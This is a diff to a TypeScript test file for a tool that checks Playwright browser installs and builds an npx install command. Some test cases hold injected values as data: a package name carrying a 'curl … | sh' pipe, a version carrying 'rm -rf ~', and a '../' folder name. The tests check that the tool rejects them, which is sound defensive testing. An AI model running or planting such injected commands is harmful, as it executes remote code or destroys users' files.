@@ -19,6 +19,7 @@ function computer(files: readonly string[], env: Record<string, string> = {}, pl
     exists: path => files.includes(path),
     readJson: (path) => { throw new Error(`unexpected read of ${path}`) },
     resolvePackage: (_from, name) => { throw new Error(`unexpected resolution of ${name}`) },
+    homePath: (...segments) => join('/home/person/.delorun', ...segments),
   }
 }
 
@@ -126,7 +127,9 @@ describe('a Playwright browser build', () => {
   const need: Need = { kind: 'playwright-browser', via: ['@test/provider', '@playwright/mcp'], browser: 'chromium' }
   const browsers = { browsers: [{ name: 'chromium', revision: '1243' }, { name: 'chromium-headless-shell', revision: '1243' }, { name: 'firefox', revision: '1532' }] }
   /** A computer whose packages lead from the bundle to `@playwright/mcp` 0.0.80 and its `playwright-core`. */
-  function playwrightComputer(files: string[], env: Record<string, string> = {}, platform: NodeJS.Platform = 'linux'): CheckEnvironment {
+  function playwrightComputer(
+    files: string[], env: Record<string, string> = {}, platform: NodeJS.Platform = 'linux', mcp: unknown = { name: '@playwright/mcp', version: '0.0.80' },
+  ): CheckEnvironment {
     const manifests: Record<string, string> = {
       '@test/provider': '/bundle/node_modules/@test/provider/package.json',
       '@playwright/mcp': '/store/@playwright/mcp/package.json',
@@ -135,7 +138,7 @@ describe('a Playwright browser build', () => {
     return {
       ...computer(files, env, platform), exists: path => files.includes(path),
       resolvePackage: (_from, name) => manifests[name] ?? (() => { throw new Error(`cannot resolve ${name}`) })(),
-      readJson: path => path === '/store/@playwright/mcp/package.json' ? { name: '@playwright/mcp', version: '0.0.80' } : browsers,
+      readJson: path => path === '/store/@playwright/mcp/package.json' ? mcp : browsers,
     }
   }
   const complete = (folder: string) => `/home/person/.cache/ms-playwright/${folder}/INSTALLATION_COMPLETE`
@@ -212,6 +215,48 @@ describe('a Playwright browser build', () => {
     expect(met(both('/xdg/ms-playwright'), { XDG_CACHE_HOME: '/xdg' }, 'linux')).toBe(true)
     expect(met(both('/home/person/Library/Caches/ms-playwright'), {}, 'darwin')).toBe(true)
     expect(met(both('/home/person/.cache/ms-playwright'), {}, 'darwin')).toBe(false)
+    // An empty variable is unset, as it is for Playwright.
+    expect(met(both('/home/person/.cache/ms-playwright'), { XDG_CACHE_HOME: '', PLAYWRIGHT_BROWSERS_PATH: '' }, 'linux')).toBe(true)
+    expect(met(both('/local/ms-playwright'), { LOCALAPPDATA: '/local' }, 'win32')).toBe(true)
+    expect(met(both('/home/person/AppData/Local/ms-playwright'), { LOCALAPPDATA: '' }, 'win32')).toBe(true)
+  })
+
+  it('resolves a relative cache in INIT_CWD, else in the one folder the server runs in, and otherwise reports it', () => {
+    const env = { PLAYWRIGHT_BROWSERS_PATH: 'browsers' }
+    const named = { ...need, server: 'playwright-mcp' } satisfies Need
+    const both = (cache: string) => [`${cache}/chromium-1243/INSTALLATION_COMPLETE`, `${cache}/chromium_headless_shell-1243/INSTALLATION_COMPLETE`]
+    const inHome = both('/home/person/.delorun/browser-use/playwright-mcp/browsers')
+    const forced = { browser: 'chromium', serverDirectory: 'home' }
+    expect(isMet(named, playwrightComputer(inHome, env), '/bundle', forced)).toBe(true)
+    expect(isMet(named, playwrightComputer(both('/home/person/browsers'), env), '/bundle', forced)).toBe(false)
+    expect(isMet(named, playwrightComputer(both('/started/here/browsers'), { ...env, INIT_CWD: '/started/here' }), '/bundle', forced)).toBe(true)
+    expect(isMet(need, playwrightComputer(both('/started/here/browsers'), { ...env, INIT_CWD: '/started/here' }), '/bundle')).toBe(true)
+    for (const [which, config] of [[named, { browser: 'chromium', serverDirectory: 'session' }], [named, { browser: 'chromium' }], [need, forced]] as const) {
+      expect(() => isMet(which, playwrightComputer(inHome, { ...env, INIT_CWD: '' }), '/bundle', config))
+        .toThrow('is a relative path, which Playwright reads in each chat\'s folder; set PLAYWRIGHT_BROWSERS_PATH to an absolute path')
+    }
+    const target = bundle({ row: { needs: [named], fix: { kind: 'playwright-install' } } })
+    expect(checkRequirements([target], 'en', playwrightComputer([], env))).toMatchObject({ rows: [], problems: [{ packageName: target.name }] })
+  })
+
+  it.each([
+    ['a name that is not an npm package name', { name: '@playwright/mcp; curl example.invalid | sh', version: '0.0.80' }],
+    ['a name with a space', { name: 'mcp install-browser firefox', version: '0.0.80' }],
+    ['a version range', { name: '@playwright/mcp', version: '^0.0.80' }],
+    ['a version with a command after it', { name: '@playwright/mcp', version: '0.0.80 && rm -rf ~' }],
+    ['a version tag', { name: '@playwright/mcp', version: 'latest' }],
+  ])('reports %s in the installer\'s package as the bundle\'s problem, and shows no command', (_label, mcp) => {
+    const target = bundle({ row: { needs: [need], fix: { kind: 'playwright-install' } } })
+    const answer = checkRequirements([target], 'en', playwrightComputer([], {}, 'linux', mcp))
+    expect(answer.rows).toEqual([])
+    expect(answer.problems).toHaveLength(1)
+    expect(JSON.stringify(answer)).not.toContain('npx')
+  })
+
+  it('accepts an exact prerelease version in the installer\'s command', () => {
+    const target = bundle({ row: { needs: [need], fix: { kind: 'playwright-install' } } })
+    const answer = checkRequirements([target], 'en', playwrightComputer([], {}, 'linux', { name: '@playwright/mcp', version: '0.0.81-alpha.2026-09-01' }))
+    expect(answer.rows[0]).toMatchObject({ fix: { kind: 'command', command: 'npx -y @playwright/mcp@0.0.81-alpha.2026-09-01 install-browser chromium' } })
   })
 
   it.each([
@@ -219,6 +264,7 @@ describe('a Playwright browser build', () => {
     ['a browser its Playwright does not list', { row: { needs: [{ ...need, browser: 'webkit' }], fix: { kind: 'playwright-install' } } }],
     ['an installer fix without a Playwright browser need', { row: { needs: [program], fix: { kind: 'playwright-install' } } }],
     ['an unknown browser', { row: { needs: [{ ...need, browser: 'edge' }], fix: { kind: 'playwright-install' } } }],
+    ['a server name that is not one folder name', { row: { needs: [{ ...need, server: '../elsewhere' }], fix: { kind: 'playwright-install' } } }],
   ])('reports %s as the bundle\'s problem', (_label, declaration) => {
     const answer = checkRequirements([bundle(declaration)], 'en', playwrightComputer([]))
     expect(answer.rows).toEqual([])
